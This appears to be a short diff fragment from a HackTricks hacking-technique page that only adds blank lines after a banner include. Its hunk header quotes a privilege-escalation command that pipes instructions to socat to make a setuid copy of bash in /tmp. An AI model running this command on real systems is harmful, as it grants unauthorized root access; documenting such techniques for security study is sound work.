@@ -42,3 +42,5 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 
 {{#include ../../banners/hacktricks-training.md}}
+
+
